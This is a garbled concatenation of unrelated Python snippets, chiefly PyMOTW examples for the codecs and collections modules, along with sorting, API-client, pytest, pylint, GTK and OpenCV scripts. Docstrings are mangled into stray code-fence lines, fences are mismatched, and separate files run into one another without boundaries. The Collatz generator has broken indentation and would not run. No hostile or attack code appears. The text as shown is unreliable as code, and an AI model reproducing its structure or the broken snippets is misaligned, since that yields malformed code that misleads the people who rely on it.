        print("postcmd({}, {})".format(stop, line))
        return cmd.Cmd.postcmd(self, stop, line)

    def do_greet(self, line):
        print("hello,", line)

    def do_EOF(self, line):
        "Exit"
        return True


if __name__ == "__main__":
    Illustrate().cmdloop("Illustrating the methods of cmd.Cmd")

```









---


```py



# end_pymotw_header
import cmd


class HelloWorld(cmd.Cmd):
    def do_greet(self, line):
        print("hello")

    def do_EOF(self, line):
        return True


if __name__ == "__main__":
    HelloWorld().cmdloop()
````

````py
Get CO2 emission data from the UK CarbonIntensity API```


```py
from datetime import date

import requests

BASE_URL = "https://api.carbonintensity.org.uk/intensity"


# Emission in the last half hour
def fetch_last_half_hour() -> str:
    last_half_hour = requests.get(BASE_URL).json()["data"][0]
    return last_half_hour["intensity"]["actual"]


# Emissions in a specific date range
def fetch_from_to(start, end) -> list:
    return requests.get(f"{BASE_URL}/{start}/{end}").json()["data"]


if __name__ == "__main__":
    for entry in fetch_from_to(start=date(2020, 10, 1), end=date(2020, 10, 3)):
        print("from {from} to {to}: {intensity[actual]}".format(**entry))
    print(f"{fetch_last_half_hour() = }")

def cocktail_shaker_sort(arr):
    """
    Cocktail_shaker_sort
    Sorting a given array
    mutation of bubble sort

    reference: https://en.wikipedia.org/wiki/Cocktail_shaker_sort

    Worst-case performance: O(N^2)
    """

    def swap(i, j):
        arr[i], arr[j] = arr[j], arr[i]

    n = len(arr)
    swapped = True
    while swapped:
        swapped = False
        for i in range(1, n):
            if arr[i - 1] > arr[i]:
                swap(i - 1, i)
                swapped = True
        if swapped == False:
            return arr
        swapped = False
        for i in range(n - 1, 0, -1):
            if arr[i - 1] > arr[i]:
                swap(i - 1, i)
                swapped = True
    return arr

import timeit
from random import randint


def cocktail_sort(collection):
    counter = 0
    length = len(collection)
    left, right = 0, length - 1

    while left <= right:
        for i in range(left, right, +1):
            if collection[i] > collection[i + 1]:
                collection[i], collection[i + 1] = collection[i + 1], collection[i]

        right -= 1
        for i in range(right, left, -1):
            if collection[i - 1] > collection[i]:
                collection[i], collection[i - 1] = collection[i - 1], collection[i]
        left += 1
        counter += 1
        print("Step %i -->" % counter, collection)

    return collection, counter


def visualization():
    length = 10
    collection = [randint(0, length) for _ in range(length)]

    print("Initial list:", collection)
    print("Visualization of algorithm work.")

    collection, counter = cocktail_sort(collection)

    print("Final list:", collection)
    print("Total numbers of passages:", counter)


def main():
    elapsed_time = timeit.timeit(visualization, number=1)
    print("Elapsed time: ", round(elapsed_time, 7), "sec.")


if __name__ == "__main__":
    main()

names = []
phone_numbers = []
num = int(input())


for i in range(num):
    name = input("Name: ")
    phone_number = input(
        "Phone Number: "
    )  # for convert to int => int(input("Phone Number: "))

    names.append(name)
    phone_numbers.append(phone_number)

print("\nName\t\t\tPhone Number\n")

for i in range(num):
    print("{}\t\t\t{}".format(names[i], phone_numbers[i]))

search_term = input("\nEnter search term: ")

print("Search result:")

if search_term in names:
    index = names.index(search_term)
    phone_number = phone_numbers[index]
    print("Name: {}, Phone Number: {}".format(search_term, phone_number))

else:
    print("Name Not Found")

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyByte-order markers```


```py

# end_pymotw_header
import codecs
from codecs_to_hex import to_hex

BOM_TYPES = [
    "BOM",
    "BOM_BE",
    "BOM_LE",
    "BOM_UTF8",
    "BOM_UTF16",
    "BOM_UTF16_BE",
    "BOM_UTF16_LE",
    "BOM_UTF32",
    "BOM_UTF32_BE",
    "BOM_UTF32_LE",
]

for name in BOM_TYPES:
    print("{:12} : {}".format(name, to_hex(getattr(codecs, name), 2)))

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyCreate a file with nonnative BOM.```


```py

# end_pymotw_header
import codecs
from codecs_to_hex import to_hex

# Pick the nonnative version of UTF-16 encoding
if codecs.BOM_UTF16 == codecs.BOM_UTF16_BE:
    bom = codecs.BOM_UTF16_LE
    encoding = "utf_16_le"
else:
    bom = codecs.BOM_UTF16_BE
    encoding = "utf_16_be"

print("Native order  :", to_hex(codecs.BOM_UTF16, 2))
print("Selected order:", to_hex(bom, 2))

# Encode the text.
encoded_text = "français".encode(encoding)
print("{:14}: {}".format(encoding, to_hex(encoded_text, 2)))

with open("nonnative-encoded.txt", mode="wb") as f:
    # Write the selected byte-order marker.  It is not included
    # in the encoded text because the byte order was given
    # explicitly when selecting the encoding.
    f.write(bom)
    # Write the byte string for the encoded text.
    f.write(encoded_text)

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyDetecting the BOM.```


```py

# end_pymotw_header
import codecs
from codecs_to_hex import to_hex

# Look at the raw data
with open("nonnative-encoded.txt", mode="rb") as f:
    raw_bytes = f.read()

print("Raw    :", to_hex(raw_bytes, 2))

# Re-open the file and let codecs detect the BOM
with codecs.open("nonnative-encoded.txt", mode="r", encoding="utf-16") as f:
    decoded_text = f.read()

print("Decoded:", repr(decoded_text))

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyRepresentations of values using different encodings.```


```py

# end_pymotw_header
from codecs_to_hex import to_hex

text = "français"
encoded = text.encode("utf-8")
decoded = encoded.decode("utf-8")

print("Original :", repr(text))
print("Encoded  :", to_hex(encoded, 1), type(encoded))
print("Decoded  :", repr(decoded), type(decoded))

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyErrors decoding Unicode data.```


```py

# end_pymotw_header
import codecs
import sys

from codecs_to_hex import to_hex

error_handling = sys.argv[1]

text = "français"
print("Original     :", repr(text))

# Save the data with one encoding
with codecs.open("decode_error.txt", "w", encoding="utf-16") as f:
    f.write(text)

# Dump the bytes from the file
with open("decode_error.txt", "rb") as f:
    print("File contents:", to_hex(f.read(), 1))

# Try to read the data with the wrong encoding
with codecs.open("decode_error.txt", "r", encoding="utf-8", errors=error_handling) as f:
    try:
        data = f.read()
    except UnicodeDecodeError as err:
        print("ERROR:", err)
    else:
        print("Read         :", repr(data))

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyDemonstrate encoding errors.```


```py

# end_pymotw_header
import codecs
import sys

error_handling = sys.argv[1]

text = "français"

try:
    # Save the data, encoded as ASCII, using the error
    # handling mode specified on the command line.
    with codecs.open(
        "encode_error.txt", "w", encoding="ascii", errors=error_handling
    ) as f:
        f.write(text)

except UnicodeEncodeError as err:
    print("ERROR:", err)

else:
    # If there was no error writing to the file,
    # show what it contains.
    with open("encode_error.txt", "rb") as f:
        print("File contents: {!r}".format(f.read()))

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyTranslating between encodings on the fly.```


```py

# end_pymotw_header
from codecs_to_hex import to_hex

import codecs
import io

# Raw version of the original data.
data = "français"

# Manually encode it as UTF-8.
utf8 = data.encode("utf-8")
print("Start as UTF-8   :", to_hex(utf8, 1))

# Set up an output buffer, then wrap it as an EncodedFile.
output = io.BytesIO()
encoded_file = codecs.EncodedFile(output, data_encoding="utf-8", file_encoding="utf-16")
encoded_file.write(utf8)

# Fetch the buffer contents as a UTF-16 encoded byte string
utf16 = output.getvalue()
print("Encoded to UTF-16:", to_hex(utf16, 2))

# Set up another buffer with the UTF-16 data for reading,
# and wrap it with another EncodedFile.
buffer = io.BytesIO(utf16)
encoded_file = codecs.EncodedFile(buffer, data_encoding="utf-8", file_encoding="utf-16")

# Read the UTF-8 encoded version of the data.
recoded = encoded_file.read()
print("Back to UTF-8    :", to_hex(recoded, 1))

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyRepresentations of values using different encodings.```


```py

# end_pymotw_header
import unicodedata
from codecs_to_hex import to_hex

text = "français"

print("Raw   : {!r}".format(text))
for c in text:
    print("  {!r}: {}".format(c, unicodedata.name(c, c)))
print("UTF-8 : {!r}".format(to_hex(text.encode("utf-8"), 1)))
print("UTF-16: {!r}".format(to_hex(text.encode("utf-16"), 2)))

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyUsing the incremental reader/writer interfaces.```


```py

# end_pymotw_header
import codecs
import sys

from codecs_to_hex import to_hex

text = b"abcdefghijklmnopqrstuvwxyz\n"
repetitions = 50

print("Text length :", len(text))
print("Repetitions :", repetitions)
print("Expected len:", len(text) * repetitions)

# Encode the text several times to build up a
# large amount of data
encoder = codecs.getincrementalencoder("bz2")()
encoded = []

print()
print("Encoding:", end=" ")
last = repetitions - 1
for i in range(repetitions):
    en_c = encoder.encode(text, final=(i == last))
    if en_c:
        print("\nEncoded : {} bytes".format(len(en_c)))
        encoded.append(en_c)
    else:
        sys.stdout.write(".")

all_encoded = b"".join(encoded)
print()
print("Total encoded length:", len(all_encoded))
print()

# Decode the byte string one byte at a time
decoder = codecs.getincrementaldecoder("bz2")()
decoded = []

print("Decoding:", end=" ")
for i, b in enumerate(all_encoded):
    final = (i + 1) == len(text)
    c = decoder.decode(bytes([b]), final)
    if c:
        print("\nDecoded : {} characters".format(len(c)))
        print("Decoding:", end=" ")
        decoded.append(c)
    else:
        sys.stdout.write(".")
print()

restored = b"".join(decoded)

print()
print("Total uncompressed length:", len(restored))

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyTrivial encoder/decoder that switches capitalization.```


```py

# end_pymotw_header
import string


def invertcaps(text):
    """Return new string with the case of all letters switched.
    """
    return "".join(
        c.upper()
        if c in string.ascii_lowercase
        else c.lower()
        if c in string.ascii_uppercase
        else c
        for c in text
    )


if __name__ == "__main__":
    print(invertcaps("ABCdef"))
    print(invertcaps("abcDEF"))

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyCharacter mapping encoder```


```py

# end_pymotw_header
import codecs
import string

# Map every character to itself
decoding_map = codecs.make_identity_dict(range(256))

# Make a list of pairs of ordinal values for the lower
# and uppercase letters
pairs = list(
    zip(
        [ord(c) for c in string.ascii_lowercase],
        [ord(c) for c in string.ascii_uppercase],
    )
)

# Modify the mapping to convert upper to lower and
# lower to upper.
decoding_map.update({upper: lower for (lower, upper) in pairs})
decoding_map.update({lower: upper for (lower, upper) in pairs})

# Create a separate encoding map.
encoding_map = codecs.make_encoding_map(decoding_map)

if __name__ == "__main__":
    print(codecs.charmap_encode("abcDEF", "strict", encoding_map))
    print(codecs.charmap_decode(b"abcDEF", "strict", decoding_map))
    print(encoding_map == decoding_map)

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyError handling with character map encodings.```


```py

# end_pymotw_header
import codecs
from codecs_invertcaps_charmap import encoding_map

text = "pi: \u03c0"

for error in ["ignore", "replace", "strict"]:
    try:
        encoded = codecs.charmap_encode(text, error, encoding_map)
    except UnicodeEncodeError as err:
        encoded = str(err)
    print("{:7}: {}".format(error, encoded))

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyWriting Unicode data to a file.```


```py

# end_pymotw_header
import codecs
import sys

encoding = sys.argv[1]
filename = encoding + ".txt"

print("Reading from", filename)
with codecs.open(filename, mode="r", encoding=encoding) as f:
    print(repr(f.read()))

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyWriting Unicode data to a file.```


```py

# end_pymotw_header
from codecs_to_hex import to_hex

import codecs
import sys

encoding = sys.argv[1]
filename = encoding + ".txt"

print("Writing to", filename)
with codecs.open(filename, mode="w", encoding=encoding) as f:
    f.write("français")

# Determine the byte grouping to use for to_hex()
nbytes = {"utf-8": 1, "utf-16": 2, "utf-32": 4}.get(encoding, 1)

# Show the raw bytes in the file
print("File contents:")
with open(filename, mode="rb") as f:
    print(to_hex(f.read(), nbytes))

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyRegistering your own codec search function.```


```py

# end_pymotw_header
import codecs
import encodings


def search1(encoding):
    print("search1: Searching for:", encoding)
    return None


def search2(encoding):
    print("search2: Searching for:", encoding)
    return None


codecs.register(search1)
codecs.register(search2)

utf8 = codecs.lookup("utf-8")
print("UTF-8:", utf8)

try:
    unknown = codecs.lookup("no-such-encoding")
except LookupError as err:
    print("ERROR:", err)

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyDemonstrate a non-Unicode codec.```


```py

# end_pymotw_header
import codecs
import io

buffer = io.StringIO()
stream = codecs.getwriter("rot_13")(buffer)

text = "abcdefghijklmnopqrstuvwxyz"

stream.write(text)
stream.flush()

print("Original:", text)
print("ROT-13  :", buffer.getvalue())

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pySending Unicode data over a socket.```


```py

# end_pymotw_header
import sys
import socketserver


class Echo(socketserver.BaseRequestHandler):
    def handle(self):
        # Get some bytes and echo them back to the client.
        data = self.request.recv(1024)
        self.request.send(data)
        return


if __name__ == "__main__":
    import codecs
    import socket
    import threading

    address = ("localhost", 0)  # let the kernel assign a port
    server = socketserver.TCPServer(address, Echo)
    ip, port = server.server_address  # what port was assigned?

    t = threading.Thread(target=server.serve_forever)
    t.setDaemon(True)  # don't hang on exit
    t.start()

    # Connect to the server
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port))

    # Send the data
    # WRONG: Not encoded first!
    text = "français"
    len_sent = s.send(text)

    # Receive a response
    response = s.recv(len_sent)
    print(repr(response))

    # Clean up
    s.close()
    server.socket.close()

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyFormat a string of bytes for output.```


```py

# end_pymotw_header
import binascii


def to_hex(t, nbytes):
    """Format text t as a sequence of nbyte long values
    separated by spaces.
    """
    chars_per_item = nbytes * 2
    hex_version = binascii.hexlify(t)
    return b" ".join(
        hex_version[start : start + chars_per_item]
        for start in range(0, len(hex_version), chars_per_item)
    )


if __name__ == "__main__":
    print(to_hex(b"abcdef", 1))
    print(to_hex(b"abcdef", 2))

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyDemonstrate a non-Unicode codec.```


```py

# end_pymotw_header
import codecs
import io

from codecs_to_hex import to_hex

buffer = io.BytesIO()
stream = codecs.getwriter("zlib")(buffer)

text = b"abcdefghijklmnopqrstuvwxyz\n" * 50

stream.write(text)
stream.flush()

print("Original length :", len(text))
compressed_data = buffer.getvalue()
print("ZIP compressed  :", len(compressed_data))

buffer = io.BytesIO(compressed_data)
stream = codecs.getreader("zlib")(buffer)

first_line = stream.readline()
print("Read first line :", repr(first_line))

uncompressed_data = first_line + stream.read()
print("Uncompressed    :", len(uncompressed_data))
print("Same            :", text == uncompressed_data)

# encoding: utf-8
````

````pyUtilities to enable code objects to be pickled.

Any process that import this module will be able to pickle code objects.  This
includes the func_code attribute of any function.  Once unpickled, new
functions can be built using new.function(code, globals()).  Eventually
we need to automate all of this so that functions themselves can be pickled.

Reference: A. Tremols, P Cogolo, "Python Cookbook," p 302-305```


```py

# Copyright (c) IPython Development Team.
# Distributed under the terms of the Modified BSD License.

import sys
import types

try:
    import copyreg  # Py 3
except ImportError:
    import copy_reg as copyreg  # Py 2


def code_ctor(*args):
    return types.CodeType(*args)


def reduce_code(co):
    args = [
        co.co_argcount,
        co.co_nlocals,
        co.co_stacksize,
        co.co_flags,
        co.co_code,
        co.co_consts,
        co.co_names,
        co.co_varnames,
        co.co_filename,
        co.co_name,
        co.co_firstlineno,
        co.co_lnotab,
        co.co_freevars,
        co.co_cellvars,
    ]
    if sys.version_info[0] >= 3:
        args.insert(1, co.co_kwonlyargcount)
    if sys.version_info > (3, 8):
        args.insert(1, co.co_posonlyargcount)
    return code_ctor, tuple(args)


copyreg.pickle(types.CodeType, reduce_code)
````

````py
You have m types of coins available in infinite quantities
where the value of each coins is given in the array S=[S0,... Sm-1]
Can you determine number of ways of making change for n units using
the given types of coins?
https://www.hackerrank.com/challenges/coin-change/problem```


```py
from __future__ import print_function


def dp_count(S, m, n):
    table = [0] * (n + 1)

    # Base case (If given value is 0)
    table[0] = 1

    # Pick all coins one by one and update table[] values
    # after the index greater than or equal to the value of the
    # picked coin
    for i in range(0, m):
        for j in range(S[i], n + 1):
            table[j] += table[j - S[i]]

    return table[n]


if __name__ == "__main__":
    print(dp_count([1, 2, 3], 3, 4))  # answer 4
    print(dp_count([2, 5, 3, 6], 4, 10))  # answer 5

#!/usr/bin/python
# -*- coding: utf-8 -*-

import sys

# Collatz conjecture
# is a series of numbers
# where the orignal number is manipulated, until
# one is obtained
# if n is even n // 2 is the next number
# else n * 3
# No matter what the value of n we'll,
# always reach 1.
# See: https://en.wikipedia.org/wiki/Collatz_conjecture

# Collatz series generator
def collatz_conjecture(n):
    if n < 1:
     raise Exception("\n  Expected a value greater than 1")

    while n != 1:
  if n % 2 == 0:
   n = n // 2
  else: n = 3*n + 1
  yield n

# If n will be negative then
# sequence will be infinite

# Interface
# Test/Play
i = 0
while True:
 if raw_input("\n[%i] Continue[Y/n]?: " % i).strip().lower() == "y":
  for v in collatz_conjecture(int(raw_input("N?: "))):
   print("  > " + str(v))
  i += 1
 else:
  print("\nSee you soon!")
  sys.exit(0)


import sys
import warnings
from types import ModuleType
from typing import Any
from typing import List

import pytest
from _pytest.deprecated import PYTEST_COLLECT_MODULE

COLLECT_FAKEMODULE_ATTRIBUTES = [
    "Collector",
    "Module",
    "Function",
    "Instance",
    "Session",
    "Item",
    "Class",
    "File",
    "_fillfuncargs",
]


class FakeCollectModule(ModuleType):
    def __init__(self) -> None:
        super().__init__("pytest.collect")
        self.__all__ = list(COLLECT_FAKEMODULE_ATTRIBUTES)
        self.__pytest = pytest

    def __dir__(self) -> List[str]:
        return dir(super()) + self.__all__

    def __getattr__(self, name: str) -> Any:
        if name not in self.__all__:
            raise AttributeError(name)
        warnings.warn(PYTEST_COLLECT_MODULE.format(name=name), stacklevel=2)
        return getattr(pytest, name)


sys.modules["pytest.collect"] = FakeCollectModule()

# Licensed under the GPL: https://www.gnu.org/licenses/old-licenses/gpl-2.0.html
# For details: https://github.com/PyCQA/pylint/blob/main/LICENSE
from pylint.reporters.base_reporter import BaseReporter


class CollectingReporter(BaseReporter):
    """collects messages"""

    name = "collector"

    def __init__(self):
        BaseReporter.__init__(self)
        self.messages = []

    def reset(self):
        self.messages = []

    _display = None

__all__ = ["Mapping", "Sequence"]

try:
    from collections.abc import Mapping, Sequence
except ImportError:
    from collections import Mapping, Sequence

# Copyright (c) 2015 Doug Hellmann.  All rights reserved.
#```


```pyChainMap as a namespace stack```


```py

# end_pymotw_header
import collections

a = {"a": "A", "c": "C"}
b = {"b": "B", "c": "D"}

m1 = collections.ChainMap(a, b)
m2 = m1.new_child()

print("m1 before:", m1)
print("m2 before:", m2)

m2["c"] = "E"

print("m1 after:", m1)
print("m2 after:", m2)

# Copyright (c) 2015 Doug Hellmann.  All rights reserved.
#```


```pyChainMap as a namespace stack```


```py

# end_pymotw_header
import collections

a = {"a": "A", "c": "C"}
b = {"b": "B", "c": "D"}
c = {"c": "E"}

m1 = collections.ChainMap(a, b)
m2 = m1.new_child(c)

print('m1["c"] = {}'.format(m1["c"]))
print('m2["c"] = {}'.format(m2["c"]))

# Copyright (c) 2015 Doug Hellmann.  All rights reserved.
#```


```pyReading values from a ChainMap```


```py

# end_pymotw_header
import collections

a = {"a": "A", "c": "C"}
b = {"b": "B", "c": "D"}

m = collections.ChainMap(a, b)

print("Individual Values")
print("a = {}".format(m["a"]))
print("b = {}".format(m["b"]))
print("c = {}".format(m["c"]))
print()

print("Keys = {}".format(list(m.keys())))
print("Values = {}".format(list(m.values())))
print()

print("Items:")
for k, v in m.items():
    print("{} = {}".format(k, v))
print()

print('"d" in m: {}'.format(("d" in m)))

# Copyright (c) 2015 Doug Hellmann.  All rights reserved.
#```


```pyReading values from a ChainMap after reordering it```


```py

# end_pymotw_header
import collections

a = {"a": "A", "c": "C"}
b = {"b": "B", "c": "D"}

m = collections.ChainMap(a, b)

print(m.maps)
print("c = {}\n".format(m["c"]))

# reverse the list
m.maps = list(reversed(m.maps))

print(m.maps)
print("c = {}".format(m["c"]))

# Copyright (c) 2015 Doug Hellmann.  All rights reserved.
#```


```pyUpdating values underneath a ChainMap```


```py

# end_pymotw_header
import collections

a = {"a": "A", "c": "C"}
b = {"b": "B", "c": "D"}

m = collections.ChainMap(a, b)
print("Before: {}".format(m["c"]))
a["c"] = "E"
print("After : {}".format(m["c"]))

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyArithmetic operations with Counters```


```py

# end_pymotw_header
import collections

c1 = collections.Counter(["a", "b", "c", "a", "b", "b"])
c2 = collections.Counter("alphabet")

print("C1:", c1)
print("C2:", c2)

print("\nCombined counts:")
print(c1 + c2)

print("\nSubtraction:")
print(c1 - c2)

print("\nIntersection (taking positive minimums):")
print(c1 & c2)

print("\nUnion (taking maximums):")
print(c1 | c2)

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyProduce the elements of the counter.```


```py

# end_pymotw_header
import collections

c = collections.Counter("extremely")
c["z"] = 0
print(c)
print(list(c.elements()))

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyUpdating counts.```


```py

# end_pymotw_header
import collections

c = collections.Counter("abcdaab")

for letter in "abcde":
    print("{} : {}".format(letter, c[letter]))

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyInitializing a Counter```


```py

# end_pymotw_header
import collections

print(collections.Counter(["a", "b", "c", "a", "b", "b"]))
print(collections.Counter({"a": 2, "b": 3, "c": 1}))
print(collections.Counter(a=2, b=3, c=1))

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyCount the most common letters in words.```


```py

# end_pymotw_header
import collections

c = collections.Counter()
with open("/usr/share/dict/words", "rt") as f:
    for line in f:
        c.update(line.rstrip().lower())

print("Most common:")
for letter, count in c.most_common(3):
    print("{}: {:>7}".format(letter, count))

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyUpdating counts.```


```py

# end_pymotw_header
import collections

c = collections.Counter()
print("Initial :", c)

c.update("abcdaab")
print("Sequence:", c)

c.update({"a": 1, "d": 5})
print("Dict    :", c)

#```


```pyInitializing a defaultdict.```


```py

# end_pymotw_header
import collections


def default_factory():
    return "default value"


d = collections.defaultdict(default_factory, foo="bar")
print("d:", d)
print("foo =>", d["foo"])
print("bar =>", d["bar"])

#```


```pyDouble-ended queue.```


```py

# end_pymotw_header
import collections

d = collections.deque("abcdefg")
print("Deque:", d)
print("Length:", len(d))
print("Left end:", d[0])
print("Right end:", d[-1])

d.remove("c")
print("remove(c):", d)

#```


```pyBurning a candle at both ends.```


```py

# end_pymotw_header
import collections
import threading
import time

candle = collections.deque(range(5))


def burn(direction, nextSource):
    while True:
        try:
            next = nextSource()
        except IndexError:
            break
        else:
            print("{:>8}: {}".format(direction, next))
            time.sleep(0.1)
    print("{:>8} done".format(direction))
    return


left = threading.Thread(target=burn, args=("Left", candle.popleft))
right = threading.Thread(target=burn, args=("Right", candle.pop))

left.start()
right.start()

left.join()
right.join()

#```


```pyRemoving items from a deque.```


```py

# end_pymotw_header
import collections

print("From the right:")
d = collections.deque("abcdefg")
while True:
    try:
        print(d.pop(), end="")
    except IndexError:
        break
print()

print("\nFrom the left:")
d = collections.deque(range(6))
while True:
    try:
        print(d.popleft(), end="")
    except IndexError:
        break
print()

#```


```pyDouble-ended queue with a maximum length.```


```py

# end_pymotw_header
import collections
import random

# Set the random seed so we see the same output each time
# the script is run.
random.seed(1)

d1 = collections.deque(maxlen=3)
d2 = collections.deque(maxlen=3)

for i in range(5):
    n = random.randint(0, 100)
    print("n =", n)
    d1.append(n)
    d2.appendleft(n)
    print("D1:", d1)
    print("D2:", d2)

#```


```pyAdding items to a deque.```


```py

# end_pymotw_header
import collections

# Add to the right
d1 = collections.deque()
d1.extend("abcdefg")
print("extend    :", d1)
d1.append("h")
print("append    :", d1)

# Add to the left
d2 = collections.deque()
d2.extendleft(range(6))
print("extendleft:", d2)
d2.appendleft(6)
print("appendleft:", d2)

#```


```pyManipulating the order of items in a deque.```


```py

# end_pymotw_header
import collections

d = collections.deque(range(10))
print("Normal        :", d)

d = collections.deque(range(10))
d.rotate(2)
print("Right rotation:", d)

d = collections.deque(range(10))
d.rotate(-2)
print("Left rotation :", d)

# Copyright (c) 2009 Doug Hellmann All rights reserved.
#```









---


```py


# end_pymotw_header
import collections

Person = collections.namedtuple("Person", "name age")

bob = Person(name="Bob", age=30)
print("Representation:", bob)
print("As Dictionary:", bob._asdict())

# Copyright (c) 2009 Doug Hellmann All rights reserved.
#```









---


```py


# end_pymotw_header
import collections

try:
    collections.namedtuple("Person", "name class age")
except ValueError as err:
    print(err)

try:
    collections.namedtuple("Person", "name age age")
except ValueError as err:
    print(err)

# Copyright (c) 2009 Doug Hellmann All rights reserved.
#```









---


```py


# end_pymotw_header
import collections

Person = collections.namedtuple("Person", "name age")

bob = Person(name="Bob", age=30)
print("Representation:", bob)
print("Fields:", bob._fields)

# Copyright (c) 2009 Doug Hellmann All rights reserved.
#```









---


```py


# end_pymotw_header
import collections

Person = collections.namedtuple("Person", "name age")

pat = Person(name="Pat", age=12)
print("\nRepresentation:", pat)

pat.age = 21

# Copyright (c) 2009 Doug Hellmann All rights reserved.
#```









---


```py


# end_pymotw_header
import collections

Person = collections.namedtuple("Person", "name age")

bob = Person(name="Bob", age=30)
print("\nRepresentation:", bob)

jane = Person(name="Jane", age=29)
print("\nField by name:", jane.name)

print("\nFields by index:")
for p in [bob, jane]:
    print("{} is {} years old".format(*p))

# Copyright (c) 2009 Doug Hellmann All rights reserved.
#```









---


```py


# end_pymotw_header
import collections

with_class = collections.namedtuple("Person", "name class age", rename=True)
print(with_class._fields)

two_ages = collections.namedtuple("Person", "name age age", rename=True)
print(two_ages._fields)

# Copyright (c) 2009 Doug Hellmann All rights reserved.
#```









---


```py


# end_pymotw_header
import collections

Person = collections.namedtuple("Person", "name age")

bob = Person(name="Bob", age=30)
print("\nBefore:", bob)
bob2 = bob._replace(name="Robert")
print("After:", bob2)
print("Same?:", bob is bob2)

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyIterating over an OrderedDict```


```py

# end_pymotw_header
import collections

print("dict       :", end=" ")
d1 = {}
d1["a"] = "A"
d1["b"] = "B"
d1["c"] = "C"

d2 = {}
d2["c"] = "C"
d2["b"] = "B"
d2["a"] = "A"

print(d1 == d2)

print("OrderedDict:", end=" ")

d1 = collections.OrderedDict()
d1["a"] = "A"
d1["b"] = "B"
d1["c"] = "C"

d2 = collections.OrderedDict()
d2["c"] = "C"
d2["b"] = "B"
d2["a"] = "A"

print(d1 == d2)

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyIterating over an OrderedDict```


```py

# end_pymotw_header
import collections

print("Regular dictionary:")
d = {}
d["a"] = "A"
d["b"] = "B"
d["c"] = "C"

for k, v in d.items():
    print(k, v)

print("\nOrderedDict:")
d = collections.OrderedDict()
d["a"] = "A"
d["b"] = "B"
d["c"] = "C"

for k, v in d.items():
    print(k, v)

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyRe-ordering an OrderedDict```


```py

# end_pymotw_header
import collections

d = collections.OrderedDict([("a", "A"), ("b", "B"), ("c", "C")])

print("Before:")
for k, v in d.items():
    print(k, v)

d.move_to_end("b")

print("\nmove_to_end():")
for k, v in d.items():
    print(k, v)

d.move_to_end("b", last=False)

print("\nmove_to_end(last=False):")
for k, v in d.items():
    print(k, v)

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyUsing a regular tuple```


```py

# end_pymotw_header
bob = ("Bob", 30, "male")
print("Representation:", bob)

jane = ("Jane", 29, "female")
print("\nField by index:", jane[0])

print("\nFields by index:")
for p in [bob, jane]:
    print("{} is a {} year old {}".format(*p))

#!/usr/bin/env python
# -*- coding: utf-8; mode: python -*-```


```py
A minimalist script to select a color with the GTK ColorSelectionDialog tool.
The selected color is returned (printed) on the consol.

- Date: 02-06-2016
- Author: Lilian Besson, (C) 2016.
- Online: https://bitbucket.org/lbesson/bin/
- Licence: MIT Licence (http://lbesson.mit-license.org).```


```py

from __future__ import print_function  # Python 2/3 compatibility !

from gi.repository import Gtk
import sys

if __name__ == "__main__":
    color_sel = Gtk.ColorSelectionDialog("GTK Color Picker (color-picker.py)")

    if len(sys.argv) > 1:
        if Gtk.gdk.Color(sys.argv[1]):
            color_sel.colorsel.set_current_color(Gtk.gdk.Color(sys.argv[1]))

    if color_sel.run() == Gtk.ResponseType.OK:
        color = color_sel.get_color_selection().get_current_color()
        # Convert to 8bit channels
        red = int(color.red / 256)
        green = int(color.green / 256)
        blue = int(color.blue / 256)
        # Format
        finalcolor = "%02x%02x%02x" % (red, green, blue)
        print(finalcolor.upper())

    color_sel.destroy()

import cv2

path = input("Please Enter the path of the image : ")
originalImage = cv2.imread(path)
grayImage = cv2.cvtColor(originalImage, cv2.COLOR_BGR2GRAY)

(thresh, blackAndWhiteImage) = cv2.threshold(grayImage, 127, 255, cv2.THRESH_BINARY)

cv2.imshow("Black white image", blackAndWhiteImage)
cv2.imshow("Original image", originalImage)
cv2.imshow("Gray image", grayImage)

cv2.waitKey(0)
cv2.destroyAllWindows()

import os
from enum import Enum
from typing import Optional

__all__ = ["ColorDepth"]


class ColorDepth(str, Enum):
    """
    Possible color depth values for the output.
    """

    value: str

    #: One color only.
    DEPTH_1_BIT = "DEPTH_1_BIT"

    #: ANSI Colors.
    DEPTH_4_BIT = "DEPTH_4_BIT"

    #: The default.
    DEPTH_8_BIT = "DEPTH_8_BIT"

    #: 24 bit True color.
    DEPTH_24_BIT = "DEPTH_24_BIT"

    # Aliases.
    MONOCHROME = DEPTH_1_BIT
    ANSI_COLORS_ONLY = DEPTH_4_BIT
    DEFAULT = DEPTH_8_BIT
    TRUE_COLOR = DEPTH_24_BIT

    @classmethod
    def from_env(cls) -> Optional["ColorDepth"]:
        """
        Return the color depth if the $PROMPT_TOOLKIT_COLOR_DEPTH environment
        variable has been set.

